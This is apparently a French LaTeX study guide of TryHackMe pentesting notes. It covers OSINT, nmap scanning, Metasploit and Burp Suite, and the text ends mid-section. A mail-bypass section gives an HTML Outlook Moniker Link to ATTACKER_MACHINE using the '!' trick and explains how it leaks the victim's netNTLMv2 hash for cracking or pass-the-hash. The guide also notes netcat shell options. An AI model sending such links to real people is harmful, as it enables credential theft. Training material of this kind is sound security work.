\documentclass[12pt,a4paper]{report}
\usepackage[utf8]{inputenc}
\usepackage[french]{babel}
\usepackage{bav4}
\usepackage{listings}
\usepackage{underscore}
\usepackage{graphicx}

\title{Guide TryHackMe - Techniques de Pentesting}
\author{BAV4 Team}
\date{\today}

\begin{document}

\maketitle
\tableofcontents
\newpage

\chapter{OSINT}

\section{Google Dorking}

Le Google Dorking permet d'affiner les recherches Google pour trouver des informations sensibles :

\begin{itemize}
    \item \monosp{site:google.com} : uniquement du site en question
    \item \monosp{inurl:admin} : contient "admin" dans l'URL
    \item \monosp{filetype:pdf} : fichiers pdf uniquement
    \item \monosp{intitle:admin} : pages avec "admin" dans leur titre
\end{itemize}

\section{Reconnaissance}

La reconnaissance (recon) est une enquête préliminaire visant à collecter des informations sur une cible. C'est la première étape de la Kill Chain pour obtenir un premier accès à un système. La reconnaissance se divise en deux catégories :

\subsection{Reconnaissance Passive}

La reconnaissance passive s'appuie sur des connaissances publiquement accessibles, sans engagement direct avec la cible. Elle permet de collecter des informations à distance, sans laisser de traces sur les systèmes cibles.

\textbf{Activités courantes :}
\begin{itemize}
    \item Consultation des enregistrements DNS depuis un serveur DNS public
    \item Analyse des offres d'emploi liées à la cible
    \item Lecture d'articles de presse sur l'entreprise cible
    \item Recherche d'informations WHOIS
\end{itemize}

\subsubsection{WHOIS}

WHOIS est un protocole de requête-réponse (RFC 3912) qui écoute sur le port TCP 43. Le registrar de domaine maintient les enregistrements WHOIS pour les noms de domaine qu'il loue.

\textbf{Informations obtenues :}
\begin{itemize}
    \item \textbf{Registrar} : Via quel registrar le domaine a été enregistré
    \item \textbf{Informations de contact} : Nom, organisation, adresse, téléphone (sauf si service de confidentialité activé)
    \item \textbf{Dates} : Création, dernière mise à jour, expiration
    \item \textbf{Name Servers} : Serveurs DNS à interroger pour résoudre le domaine
\end{itemize}

\textbf{Utilisation :}

\cmd{whois DOMAIN\_NAME}

\textbf{Note :} De nombreux services WHOIS redactent les emails pour éviter le harvesting. Beaucoup d'organisations utilisent des services de confidentialité pour protéger leurs informations.

\subsubsection{DNS Lookup}

Les outils de lookup DNS permettent d'obtenir les adresses IP et autres enregistrements DNS associés à un domaine.

\textbf{nslookup}

Outil de consultation de serveurs de noms (Name Server Look Up).

\textbf{Syntaxe :}

\cmd{nslookup OPTIONS DOMAIN\_NAME SERVER}

\textbf{Paramètres :}
\begin{itemize}
    \item \textbf{OPTIONS} : Type de requête (A, AAAA, CNAME, MX, SOA, TXT)
    \item \textbf{DOMAIN\_NAME} : Domaine à interroger
    \item \textbf{SERVER} : Serveur DNS à utiliser (1.1.1.1, 8.8.8.8, 9.9.9.9, etc.)
\end{itemize}

\textbf{Types de requêtes :}
\begin{itemize}
    \item \textbf{A} : Adresses IPv4
    \item \textbf{AAAA} : Adresses IPv6
    \item \textbf{CNAME} : Canonical Name (alias)
    \item \textbf{MX} : Serveurs de messagerie
    \item \textbf{SOA} : Start of Authority
    \item \textbf{TXT} : Enregistrements texte
\end{itemize}

\textbf{Exemples :}

\cmd{nslookup -type=A example.com 1.1.1.1}

\cmd{nslookup -type=MX example.com}

\textbf{dig}

Outil avancé "Domain Information Groper" offrant plus de détails que nslookup, notamment le TTL (Time To Live) par défaut.

\textbf{Syntaxe :}

\cmd{dig DOMAIN\_NAME TYPE}

\cmd{dig @SERVER DOMAIN\_NAME TYPE}

\textbf{Exemple :}

\cmd{dig example.com MX}

\cmd{dig @1.1.1.1 example.com A}

\subsubsection{Découverte de Sous-domaines}

Les outils DNS standards (nslookup, dig) ne peuvent pas découvrir automatiquement les sous-domaines. Les sous-domaines peuvent révéler des informations cruciales et présenter des vulnérabilités si mal maintenus.

\textbf{DNSDumpster}

Service en ligne offrant des réponses détaillées aux requêtes DNS et la découverte de sous-domaines.

\textbf{URL :} \url{https://dnsdumpster.com/}

\textbf{Capacités :}
\begin{itemize}
    \item Découverte de sous-domaines non explicitement annoncés
    \item Résolution des noms de domaine vers adresses IP
    \item Géolocalisation des serveurs
    \item Informations sur les serveurs DNS et MX
    \item Visualisation graphique des données collectées
    \item Enregistrements TXT
\end{itemize}

\textbf{Alternatives :}
\begin{itemize}
    \item Brute-forcing DNS avec wordlists
    \item Utilisation de multiples moteurs de recherche
    \item Outils automatisés (sublist3r, amass, etc.)
\end{itemize}

\subsubsection{Shodan.io}

Shodan.io est un moteur de recherche pour dispositifs connectés à Internet. Contrairement aux moteurs de recherche traditionnels, Shodan indexe les services et dispositifs exposés en ligne.

\textbf{URL :} \url{https://www.shodan.io/}

\textbf{Fonctionnement :}

Shodan tente de se connecter à tous les dispositifs accessibles en ligne, collecte les informations des services actifs et les stocke dans une base de données consultable.

\textbf{Informations obtenues :}
\begin{itemize}
    \item Adresses IP
    \item Hébergeur et localisation géographique
    \item Type et version de serveur
    \item Services exposés et leurs configurations
    \item Bannières de services
    \item Certificats SSL
\end{itemize}

\textbf{Utilisation :}

Recherche par nom de domaine, adresse IP, type de service, localisation, ou combinaison de filtres avancés.

\textbf{Applications :}
\begin{itemize}
    \item \textbf{Offensive} : Identifier les surfaces d'attaque sans engagement actif
    \item \textbf{Défensive} : Découvrir les dispositifs exposés de son organisation
    \item \textbf{Renseignement} : Cartographier l'infrastructure réseau d'une cible
\end{itemize}

\subsection{Reconnaissance Active}

La reconnaissance active nécessite un engagement direct avec la cible. Elle est plus intrusive et peut être détectée, nécessitant une autorisation légale appropriée.

\textbf{Activités courantes :}
\begin{itemize}
    \item Connexion aux serveurs de l'entreprise (HTTP, FTP, SMTP)
    \item Scans de ports et de vulnérabilités
    \item Ingénierie sociale (appels téléphoniques)
    \item Accès physique aux locaux (pretexting)
\end{itemize}

\textbf{Attention :} La nature invasive de la reconnaissance active peut rapidement mener à des problèmes légaux sans autorisation appropriée.

\subsubsection{Navigateur Web}

Le navigateur web est un outil de reconnaissance pratique et discret. Les connexions apparaissent légitimes parmi le trafic normal.

\textbf{Extensions utiles :}
\begin{itemize}
    \item \textbf{FoxyProxy} : Changement rapide de proxy (utile avec Burp Suite)
    \item \textbf{User-Agent Switcher and Manager} : Simulation de différents navigateurs/OS
    \item \textbf{Wappalyzer} : Identification des technologies utilisées par le site
\end{itemize}

\subsubsection{Ping}

Vérifie si un système est en ligne via ICMP Echo (type 8) et Echo Reply (type 0).

\cmd{ping -c COUNT HOSTNAME}

\textbf{Paramètres :} \monosp{-c COUNT} (Linux), \monosp{-n COUNT} (Windows)

\textbf{Vérifie :} Système en ligne, connectivité réseau, blocage firewall ICMP, latence réseau

\subsubsection{Traceroute}

Identifie le chemin réseau et les routeurs intermédiaires via manipulation du TTL.

\cmd{traceroute HOSTNAME}

(Windows : \monosp{tracert})

\textbf{Vérifie :} Nombre de hops, IPs des routeurs, latence par hop, routage dynamique

\subsubsection{Telnet}

Banner grabbing sur n'importe quel service TCP. Port par défaut : \textbf{TCP 23}. \textbf{Attention :} transmission en clair.

\cmd{telnet IP\_ADDRESS PORT}

Puis envoyer les commandes du protocole (HTTP, SMTP, POP3, FTP).

\textbf{Vérifie :} Type et version du serveur, bannières de services, headers de réponse

\subsubsection{Netcat (nc)}

Outil polyvalent TCP/UDP pour banner grabbing, shells et transferts.

\cmd{nc IP\_ADDRESS PORT}

\textbf{Paramètres :} \monosp{-l -p PORT} (mode serveur), \monosp{-u} (UDP), \monosp{-e} (bind shell)

\textbf{Vérifie :} Bannières de services, connectivité TCP/UDP, possibilité de reverse/bind shell

\section{Network Scanning}

Phase cruciale pour cartographier la surface d'attaque et identifier les systèmes actifs.

\subsection{Nmap}

Outil standard de cartographie réseau et d'audit de sécurité.

\textbf{Objectifs :} Identifier systèmes actifs, services, versions et OS.

\subsubsection{Spécification de Cibles}

\begin{itemize}
    \item \textbf{Liste/IP} : \monosp{scanme.nmap.org 10.10.1.1}
    \item \textbf{Plage} : \monosp{10.11.12.15-20}
    \item \textbf{CIDR} : \monosp{10.10.1.0/24}
    \item \textbf{Fichier} : \monosp{-iL list.txt}
\end{itemize}

\textbf{Preview :}

\cmd{nmap -sL TARGETS}

\subsubsection{Découverte d'Hôtes}

Identification des systèmes actifs avant scan de ports.

\textbf{Méthodes automatiques :}
\begin{itemize}
    \item \textbf{Privilégié (Local)} : Requêtes ARP.
    \item \textbf{Privilégié (Distant)} : ICMP Echo, TCP ACK (80), TCP SYN (443), ICMP Timestamp.
    \item \textbf{Non-privilégié} : TCP 3-way handshake (SYN) ports 80, 443.
\end{itemize}

\textbf{Ping Scan (Sans port scan) :}

\cmd{nmap -sn TARGETS}

\subsubsection{Méthodes de Scan}

\textbf{ARP Scan (Local)}

Méthode la plus fiable sur réseau local. Basée sur les réponses ARP.

\rootcmd{nmap -PR -sn TARGET/24}

\textbf{arp-scan (Alternative)}

Outil dédié et rapide pour l'ARP scanning.

\rootcmd{arp-scan -l}
\rootcmd{arp-scan -I eth0 TARGET/24}

\textbf{ICMP Scan}

Utilise le protocole ICMP. Souvent bloqué par les firewalls (notamment Windows par défaut).

\begin{itemize}
    \item \textbf{Echo (Type 8)} : \rootcmd{nmap -PE -sn TARGET}
    \item \textbf{Timestamp (Type 13)} : \rootcmd{nmap -PP -sn TARGET}
    \item \textbf{Mask (Type 17)} : \rootcmd{nmap -PM -sn TARGET}
\end{itemize}

\textbf{TCP/UDP Ping}

Bypass potentiel de firewall en simulant des connexions services.

\begin{itemize}
    \item \textbf{TCP SYN} : Envoie SYN. Privilégié (pas de handshake complet).
    \rootcmd{nmap -PS80,443 TARGET}
    \item \textbf{TCP ACK} : Envoie ACK.
    \rootcmd{nmap -PA80 TARGET}
    \item \textbf{UDP} : Envoie paquets UDP.
    \rootcmd{nmap -PU TARGET}
\end{itemize}

\subsubsection{Options DNS}

\begin{itemize}
    \item \textbf{Forcer résolution (même offline)} : \cmd{nmap -R TARGET}
    \item \textbf{Désactiver résolution (Rapide)} : \cmd{nmap -n TARGET}
    \item \textbf{Serveur DNS spécifique} : \cmd{nmap --dns-servers 8.8.8.8 TARGET}
\end{itemize}

\subsubsection{États des Ports}

Nmap classe les ports en plusieurs états :
\begin{itemize}
    \item \textbf{Open} : Un service écoute sur le port.
    \item \textbf{Closed} : Pas de service, mais le port répond (accessible).
    \item \textbf{Filtered} : Le port n'est pas accessible (bloqué par un pare-feu), Nmap ne peut déterminer s'il est ouvert ou fermé.
\end{itemize}

\subsubsection{Techniques de Scan de Ports}

\textbf{TCP Connect Scan (-sT)}

Effectue le 3-way handshake complet.
\begin{itemize}
    \item \textbf{Utilisation} : Utilisateur non-privilégié.
    \item \textbf{Caractéristiques} : Plus lent, plus facile à détecter (logs).
\end{itemize}

\cmd{nmap -sT TARGET}

\textbf{TCP SYN Scan (-sS)}

Scan par défaut (si privilèges). Ne termine pas la connexion (Half-open : SYN -> SYN/ACK -> RST).
\begin{itemize}
    \item \textbf{Utilisation} : Root/Sudo requis.
    \item \textbf{Caractéristiques} : Rapide, furtif (souvent non logué).
\end{itemize}

\rootcmd{nmap -sS TARGET}

\textbf{UDP Scan (-sU)}

Scan du protocole sans connexion UDP.
\begin{itemize}
    \item \textbf{Mécanisme} : Port ouvert ne répond généralement pas; port fermé répond ICMP Unreachable.
    \item \textbf{Caractéristiques} : Lent, souvent combiné avec un scan TCP.
\end{itemize}

\rootcmd{nmap -sU TARGET}

\subsubsection{Sélection de Ports}

Par défaut, Nmap scanne les 1000 ports les plus courants.

\begin{itemize}
    \item \textbf{Liste} : \monosp{-p 22,80,443}
    \item \textbf{Plage} : \monosp{-p 1-1023}
    \item \textbf{Tous les ports} : \monosp{-p-} (scan les 65535 ports)
    \item \textbf{Mode Rapide} : \monosp{-F} (100 ports les plus communs)
    \item \textbf{Top Ports} : \monosp{--top-ports 10}
\end{itemize}

\subsubsection{Temporisation et Performance}

Le paramètre \monosp{-T<0-5>} contrôle la vitesse du scan.

\begin{itemize}
    \item \textbf{T0 - T1} : Paranoïaque/Furtif (évite IDS). Très lent.
    \item \textbf{T3} : Normal (défaut).
    \item \textbf{T4} : Agressif (recommandé pour CTF/Apprentissage).
    \item \textbf{T5} : Insane (risque de perte de paquets).
\end{itemize}

\textbf{Contrôle manuel :}
\begin{itemize}
    \item \monosp{--min-rate / --max-rate <N>} : Contrôle le nombre de paquets par seconde.
\end{itemize}

\subsection{Masscan}

Scanner asynchrone extrêmement rapide (millions de paquets/sec). Syntaxe proche de Nmap mais fonctionnalités réduites. Attention à la saturation réseau.


\newpage
\chapter{Pentesting}

\section{Social Engineering}

\subsection{Tools}

\textbf{SET (Social-Engineer Toolkit)} : \url{https://github.com/trustedsec/social-engineer-toolkit}

The Social-Engineer Toolkit est un framework open-source de test de pénétration conçu pour l'ingénierie sociale. SET dispose d'un certain nombre de vecteurs d'attaque personnalisés qui permettent de créer rapidement une attaque crédible.

\section{ByPass Technics}

\subsection{Mails}

\textbf{Outlook Moniker Links} : Les accès à des ressources externes par des liens par mail sont vérifiés par un SMB (Server Message Block) et protégés par la "Protected View" d'Outlook.

Exemple de lien pour appel Skype.

\textbf{Bypass avec "!"} :

\begin{codebox}{email.html}
\begin{lstlisting}[language=HTML]
<p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>
\end{lstlisting}
\end{codebox}

devient :

\begin{codebox}{email-bypass.html}
\begin{lstlisting}[language=HTML]
<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
\end{lstlisting}
\end{codebox}

Et le PV (Protected View) ne voit rien !

\textbf{Mécanisme d'attaque :}
\begin{itemize}
    \item Même si ce partage n'existe pas réellement, Windows va quand même tenter d'y accéder automatiquement
    \item Lors de cette tentative, l'ordinateur de la victime envoie une authentification pour essayer de se connecter
    \item Cette authentification inclut le hash \monosp{netNTLMv2} de la victime
\end{itemize}

L'attaquant peut capturer ce hash et essayer de :
\begin{itemize}
    \item le cracker pour obtenir le mot de passe
    \item ou l'utiliser dans un pass-the-hash attack
\end{itemize}

Les Moniker Links s'appuient sur une technologie Windows appelée COM (Component Object Model). COM permet de charger des objets ou des composants depuis diverses sources, et dans certains cas, cela peut mener à une exécution de code.

\newpage
\chapter{Tools}

\section{Metasploit}

Les principaux composants du Metasploit Framework peuvent être résumés comme suit :

\begin{itemize}
    \item \textbf{msfconsole} : L'interface en ligne de commande principale
    \item \textbf{Modules} : modules de support tels que exploits, scanners, payloads, etc.
    \item \textbf{Tools} : outils autonomes pour la recherche de vulnérabilités, l'évaluation des vulnérabilités ou les tests de pénétration
\end{itemize}

\subsection{Payloads}

Les payloads sont des codes qui s'exécuteront sur le système cible :

\begin{itemize}
    \item \textbf{Adapters} : Un adapteur enveloppe les payloads simples pour les convertir en différents formats (ex: adaptateur Powershell)
    \item \textbf{Singles} : Payloads autonomes (ajouter un utilisateur, lancer notepad.exe, etc.) qui n'ont pas besoin de télécharger un composant supplémentaire
    \item \textbf{Stagers} : Responsables de l'établissement d'un canal de connexion entre Metasploit et le système cible
    \item \textbf{Stages} : Téléchargés par le stager, permettent d'utiliser des payloads de plus grande taille
\end{itemize}

\textbf{Identification des payloads :}

\begin{itemize}
    \item \monosp{generic/shell\_reverse\_tcp} : payload inline (single), indiqué par le "\_" entre "shell" et "reverse"
    \item \monosp{windows/x64/shell/reverse\_tcp} : payload staged, indiqué par le "/" entre "shell" et "reverse"
\end{itemize}

\subsection{Commandes}

\textbf{use} : Entrer dans un contexte de travail

\cmd{use exploit/windows/smb/ms017\_00...}

Le contexte de travail nécessite des paramètres :
\begin{itemize}
    \item \monosp{set NOM\_PARAMETRE VALUE} : définir un paramètre (juste pour le module)
    \item \monosp{unset} ou \monosp{unset all} : supprimer un/tous les paramètres
    \item \monosp{setg} et \monosp{unsetg} : définir/supprimer un paramètre pour tous les modules
\end{itemize}

Une fois tout configuré :

\cmd{run}

ou

\cmd{exploit -z}

(l'option \monosp{-z} pour passer en arrière-plan)

\textbf{Gestion des sessions :}

\cmd{sessions}

Utiliser une session ouverte :

\cmd{sessions -i 2}

\textbf{Paramètres les plus courants :}

\begin{itemize}
    \item \textbf{RHOSTS} : "Remote host", l'adresse IP du système cible (supporte CIDR : /24, /16, etc.)
    \item \textbf{RPORT} : "Remote port", le port sur le système cible
    \item \textbf{PAYLOAD} : Le payload utilisé avec l'exploit
    \item \textbf{LHOST} : "Localhost", l'adresse IP de la machine attaquante
    \item \textbf{LPORT} : "Local port", le port pour le reverse shell
    \item \textbf{SESSION} : ID de session de chaque connexion établie
\end{itemize}

\textbf{Autres commandes utiles :}

\cmd{info}

Donne toutes les infos relatives au contexte.

\cmd{back}

Sortir du contexte.

\cmd{show payloads}

Liste les payloads disponibles.

\textbf{Recherche :}

\cmd{search type:auxiliary telnet}

\cmd{search ms17-010}

\textit{Tips :} Si plusieurs modules sont listés avec des numéros, vous pouvez utiliser directement \monosp{use 3} au lieu de taper le nom complet.

\newpage
\chapter{Burp Suite}

\section{Introduction}

Burp Suite est un framework basé sur Java conçu comme solution complète pour effectuer des tests de pénétration d'applications web. C'est devenu l'outil standard de l'industrie pour les évaluations de sécurité manuelles des applications web et mobiles, y compris celles qui reposent sur des APIs.

\subsection{Principe de Fonctionnement}

Burp Suite capture et permet la manipulation de tout le trafic HTTP/HTTPS entre un navigateur et un serveur web. Cette capacité fondamentale forme l'épine dorsale du framework.

En interceptant les requêtes, les utilisateurs ont la flexibilité de les router vers différents composants du framework. La capacité d'intercepter, visualiser et modifier les requêtes web avant qu'elles n'atteignent le serveur cible, ou même manipuler les réponses avant qu'elles ne soient reçues par le navigateur, fait de Burp Suite un outil inestimable pour les tests manuels d'applications web.

\subsection{Éditions}

\textbf{Burp Suite Community} : Version gratuite pour usage non-commercial. Fournit les fonctionnalités de base suffisantes pour la majorité des tests manuels.

\textbf{Burp Suite Professional} : Version complète avec fonctionnalités avancées :
\begin{itemize}
    \item Scanner automatique de vulnérabilités
    \item Fuzzer/brute-forcer sans limitation de vitesse
    \item Sauvegarde de projets et génération de rapports
    \item API intégrée pour intégration avec d'autres outils
    \item Accès illimité aux extensions
    \item Accès au Burp Suite Collaborator (request catcher)
\end{itemize}

\textbf{Burp Suite Enterprise} : Utilisé principalement pour le scan continu. Scanner automatique qui analyse périodiquement les applications web pour détecter les vulnérabilités, similaire aux outils comme Nessus. Réside sur un serveur plutôt que sur une machine locale.

\subsection{Composants Principaux}

\textbf{Proxy} : Aspect le plus renommé de Burp Suite. Permet l'interception et la modification des requêtes et réponses lors de l'interaction avec les applications web.

\textbf{Repeater} : Permet de capturer, modifier et renvoyer la même requête plusieurs fois. Particulièrement utile pour créer des payloads par essai-erreur (ex: SQLi) ou tester la fonctionnalité d'un endpoint.

\textbf{Intruder} : Permet de bombarder des endpoints avec des requêtes. Couramment utilisé pour les attaques de brute-force ou le fuzzing. (Limité en vitesse dans Community)

\textbf{Decoder} : Service de transformation de données. Peut décoder les informations capturées ou encoder des payloads avant de les envoyer à la cible.

\textbf{Comparer} : Permet la comparaison de deux ensembles de données au niveau des mots ou des octets. La possibilité d'envoyer directement des segments de données potentiellement larges vers un outil de comparaison avec un simple raccourci clavier accélère considérablement le processus.

\textbf{Sequencer} : Généralement utilisé pour évaluer l'aléatoire des tokens, comme les valeurs de cookies de session ou autres données supposément générées aléatoirement.

\subsection{Extensions}

La base de code Java de Burp Suite facilite le développement d'extensions pour améliorer les fonctionnalités du framework :

\begin{itemize}
    \item Extensions en Java, Python (Jython) ou Ruby (JRuby)
    \item Module Extender pour chargement rapide
    \item BApp Store : marketplace pour télécharger des modules tiers
    \item Exemple : Logger++ pour étendre la fonctionnalité de logging
\end{itemize}

\section{Installation et Configuration}

\subsection{Installation}

\textbf{Téléchargement} : \url{https://portswigger.net/burp/communitydownload}

\textbf{Kali Linux} : Burp Suite est pré-installé. Si absent :

\cmd{sudo apt install burpsuite}

\textbf{Windows/Linux/macOS} : Installer via l'exécutable/script téléchargé depuis le site officiel. Sur Linux sans sudo, l'installation se fait dans \monosp{\textasciitilde/BurpSuiteCommunity/}.

\subsection{Premier Lancement}

\textbf{1) Lancement}

Accepter les termes et conditions.

\textbf{2) Type de Projet}

Dans Burp Suite Community, les options sont limitées. Cliquer sur \textbf{Next}.

\textbf{3) Configuration}

Garder les paramètres par défaut dans la plupart des cas. Cliquer sur \textbf{Start Burp}.

\subsection{Dashboard}

Le Dashboard est divisé en quatre quadrants :

\textbf{Tasks} : Permet de définir les tâches en arrière-plan. Par défaut, "Live Passive Crawl" enregistre automatiquement les pages visitées.

\textbf{Event log} : Fournit des informations sur les actions effectuées par Burp Suite (démarrage du proxy, détails des connexions).

\textbf{Issue Activity} : (Professional uniquement) Affiche les vulnérabilités identifiées par le scanner automatique, classées par gravité.

\textbf{Advisory} : (Professional uniquement) Informations détaillées sur les vulnérabilités identifiées, avec références et remédiations suggérées.

\textbf{Note :} Les icônes de point d'interrogation ouvrent des fenêtres d'aide contextuelle pour chaque section.

\subsection{Navigation}

\textbf{Barre de menu principale} : Sélection des modules (Proxy, Repeater, Intruder, etc.)

\textbf{Barre secondaire} : Sous-onglets du module sélectionné (ex: Proxy Intercept, Proxy HTTP history)

\textbf{Détacher les onglets} : Menu \textit{Window} > \textit{Detach} pour ouvrir un onglet dans une fenêtre séparée

\textbf{Raccourcis clavier par défaut :}

\begin{itemize}
    \item \monosp{Ctrl + Shift + D} : Dashboard
    \item \monosp{Ctrl + Shift + T} : Target
    \item \monosp{Ctrl + Shift + P} : Proxy
    \item \monosp{Ctrl + Shift + I} : Intruder
    \item \monosp{Ctrl + Shift + R} : Repeater
\end{itemize}

\subsection{Paramètres}

Deux types de paramètres :

\textbf{User settings (Global)} : Affectent toute l'installation Burp Suite, appliqués à chaque démarrage

\textbf{Project settings} : Spécifiques au projet actuel. Non sauvegardés dans Community Edition

\textbf{Accès :} Bouton \textbf{Settings} dans la barre de navigation supérieure

\textbf{Menu gauche :}
\begin{itemize}
    \item Search : Recherche de paramètres par mots-clés
    \item Type filter : Filtrer User/Project settings
    \item Categories : Sélection par catégorie
\end{itemize}

\subsection{Configuration du Proxy Navigateur}

Pour utiliser Burp Suite, il faut configurer le navigateur pour rediriger le trafic :

\textbf{1) Installer FoxyProxy} (Firefox)

Extension FoxyProxy Basic (déjà installé sur AttackBox)

\textbf{2) Configurer Burp Proxy}

Cliquer sur l'icône FoxyProxy > \textit{Options} > \textit{Add}

\textbf{Paramètres :}
\begin{itemize}
    \item Title : Burp
    \item Proxy IP : \ip{127.0.0.1}
    \item Port : \ipport{8080}
\end{itemize}

\textbf{3) Activer}

Cliquer sur FoxyProxy et sélectionner la configuration Burp

\textbf{4) Tester}

\begin{itemize}
    \item S'assurer que \textit{Intercept is on} dans l'onglet Proxy de Burp Suite
    \item Visiter une page web
    \item La requête HTTP apparaîtra dans Burp Suite
    \item Le navigateur se figera jusqu'à ce que la requête soit forwarded ou dropped
\end{itemize}

\textbf{Attention :} Ne pas oublier de désactiver l'interception quand elle n'est pas nécessaire !

\section{Target}

L'onglet Target fournit plus que le simple contrôle de la portée des tests. Il se compose de trois sous-onglets :

\subsection{Site Map}

Permet de cartographier les applications web ciblées dans une structure arborescente. Chaque page visitée avec le proxy actif sera affichée sur la site map.

\textbf{Utilisation :}
\begin{itemize}
    \item Génération automatique en naviguant simplement sur l'application web
    \item (Professional uniquement) Crawling automatisé de la cible
    \item Particulièrement utile pour cartographier les APIs
    \item Tous les endpoints API accédés seront capturés
\end{itemize}

\subsection{Issue Definitions}

Liste exhaustive de toutes les vulnérabilités que le scanner recherche (Professional). Même dans Community, cette liste reste accessible comme référence :

\begin{itemize}
    \item Descriptions complètes des vulnérabilités web
    \item Références et ressources
    \item Utile pour la documentation dans les rapports
    \item Aide à la description des vulnérabilités identifiées manuellement
\end{itemize}

\subsection{Scope Settings}

Permet de contrôler la portée cible dans Burp Suite :

\begin{itemize}
    \item Inclure ou exclure des domaines/IPs spécifiques
    \item Définir la portée des tests
    \item Se concentrer sur les applications web spécifiquement ciblées
    \item Éviter de capturer du trafic inutile
\end{itemize}

\section{Burp Proxy}

Le Burp Proxy est un outil fondamental et crucial dans Burp Suite. Il permet la capture des requêtes et réponses entre l'utilisateur et le serveur web cible.

\subsection{Points Clés}

\textbf{Interception des Requêtes} : Quand les requêtes sont faites via le Burp Proxy, elles sont interceptées et retenues avant d'atteindre le serveur cible. Les requêtes apparaissent dans l'onglet Proxy, permettant :

\begin{itemize}
    \item Forward : envoyer la requête
    \item Drop : abandonner la requête
    \item Edit : modifier la requête
    \item Send to : envoyer vers d'autres modules Burp
\end{itemize}

Pour désactiver l'interception : cliquer sur \textit{Intercept is on}

\textbf{Contrôle Total} : La capacité d'intercepter les requêtes donne aux testeurs un contrôle complet sur le trafic web, ce qui est inestimable pour tester les applications web.

\textbf{Capture et Logging} : Burp Suite capture et enregistre les requêtes faites via le proxy par défaut, même quand l'interception est désactivée. Utile pour analyse ultérieure.

\textbf{Support WebSocket} : Burp Suite capture et enregistre également la communication WebSocket.

\textbf{Historiques} : Les requêtes capturées peuvent être visualisées dans les sous-onglets \textit{HTTP history} et \textit{WebSockets history}.

\subsection{Options du Proxy}

Accès via le bouton \textit{Proxy settings}. Ces options fournissent un contrôle étendu sur le comportement et les fonctionnalités du Proxy.

\subsubsection{Interception des Réponses}

Par défaut, le proxy n'intercepte pas les réponses du serveur sauf demande explicite par requête.

L'option \textit{"Intercept responses based on the following rules"} avec les règles définies permet une interception de réponses plus flexible.

\subsubsection{Match and Replace}

La section "Match and Replace" permet l'utilisation d'expressions régulières (regex) pour modifier les requêtes entrantes et sortantes de manière dynamique :

\begin{itemize}
    \item Modifier le user agent
    \item Manipuler les cookies
    \item Modifier automatiquement des headers
    \item Remplacer des chaînes spécifiques
\end{itemize}

\subsection{Actions Contextuelles}

Clic droit sur une requête pour :
\begin{itemize}
    \item Forward/Drop la requête
    \item Send to Repeater/Intruder/etc.
    \item Copier l'URL
    \item Ajouter au scope
    \item Effectuer diverses actions spécifiques au contexte
\end{itemize}

\section{Burp Suite Repeater}

\subsection{Objectif}

Repeater permet de manipuler et renvoyer les requêtes interceptées vers une cible. Les requêtes capturées dans Proxy peuvent être éditées et envoyées de manière répétée. Alternative graphique à cURL pour créer des payloads et visualiser les réponses.

\subsection{Interface}

L'interface de Repeater se compose de six sections principales :

\begin{itemize}
    \item \textbf{Request View} : Zone d'édition de la requête
    \item \textbf{Response View} : Affichage de la réponse du serveur
    \item \textbf{Target} : Informations sur la cible
    \item \textbf{Inspector} : Analyse détaillée de la requête/réponse
    \item \textbf{History} : Navigation dans l'historique des modifications
    \item \textbf{Send} : Bouton d'envoi de la requête
\end{itemize}

\subsection{Utilisation}

\textbf{Transfert depuis Proxy :}

Clic droit sur une requête capturée > \textit{Send to Repeater} ou \monosp{Ctrl + R}

\textbf{Modification et envoi :}

\begin{enumerate}
    \item Éditer la requête dans Request View
    \item Cliquer sur \textit{Send}
    \item Observer la réponse dans Response View
    \item Utiliser les boutons historique pour naviguer entre versions
\end{enumerate}

\textbf{Exemple :} Modifier le header \monosp{Connection: close} en \monosp{Connection: open} génère une réponse avec \monosp{Connection: keep-alive}.

\subsection{Options d'Affichage}

Quatre modes de visualisation disponibles pour les réponses :

\begin{itemize}
    \item \textbf{Pretty} : Formatage amélioré pour lisibilité (par défaut)
    \item \textbf{Raw} : Réponse brute non formatée
    \item \textbf{Hex} : Vue octet par octet pour fichiers binaires
    \item \textbf{Render} : Rendu visuel comme dans un navigateur
\end{itemize}

\textbf{Caractères non-imprimables :} Le bouton \monosp{\textbackslash n} affiche les caractères invisibles comme \monosp{\textbackslash r\textbackslash n} (carriage return + newline).

\subsection{Inspector}

Breakdown visuel organisé des composants de requête/réponse. Disponible en Proxy et Repeater.

\textbf{Sections modifiables :}

\begin{itemize}
    \item \textbf{Request Attributes} : Location, méthode HTTP, protocole (HTTP/1, HTTP/2)
    \item \textbf{Request Query Parameters} : Données GET envoyées via URL (ex: \monosp{?redirect=false})
    \item \textbf{Request Body Parameters} : Données POST spécifiques aux requêtes POST
    \item \textbf{Request Cookies} : Liste modifiable des cookies
    \item \textbf{Request Headers} : Ajout, modification, suppression de headers
    \item \textbf{Response Headers} : Consultation uniquement (non modifiable)
\end{itemize}

Le format tabulaire d'Inspector facilite l'expérimentation et la compréhension de l'impact des modifications sur la version brute de la requête.

\section{Burp Suite Intruder}

\subsection{Objectif}

Intruder est l'outil de fuzzing intégré de Burp Suite permettant la modification automatique de requêtes et les tests répétitifs avec variations de valeurs. Comparable à \monosp{Wfuzz} ou \monosp{ffuf}, il permet :

\begin{itemize}
    \item Brute-force de formulaires de connexion avec wordlists
    \item Fuzzing de sous-répertoires, endpoints ou virtual hosts
    \item Tests automatisés avec valeurs définies par l'utilisateur
\end{itemize}

\textbf{Limitation Community :} Vitesse fortement réduite par rate-limiting (vs Professional).

\subsection{Interface et Sous-onglets}

\textbf{Positions} : Sélection du type d'attaque et configuration des emplacements d'insertion des payloads dans le template de requête.

\textbf{Payloads} : Sélection des valeurs à insérer (wordlists, etc.). Configuration du comportement :
\begin{itemize}
    \item Règles de pré-traitement (ajout préfixe/suffixe, match and replace)
    \item Exclusion basée sur regex
\end{itemize}

\textbf{Resource Pool} : (Professional uniquement) Allocation de ressources entre tâches automatisées.

\textbf{Settings} : Configuration du comportement d'attaque. Gestion des résultats et réponses (flagging de texte spécifique, traitement des redirections 3xx).

\subsection{Configuration des Positions}

Burp Suite identifie automatiquement les positions probables (surlignées en vert, encadrées par §).

\textbf{Boutons de gestion :}
\begin{itemize}
    \item \textbf{Add §} : Ajouter manuellement une position (sélectionner + cliquer)
    \item \textbf{Clear §} : Supprimer toutes les positions définies
    \item \textbf{Auto §} : Ré-identifier automatiquement les positions probables
\end{itemize}

\subsection{Configuration des Payloads}

Quatre sections principales dans l'onglet Payloads :

\textbf{1. Payload Sets :}
\begin{itemize}
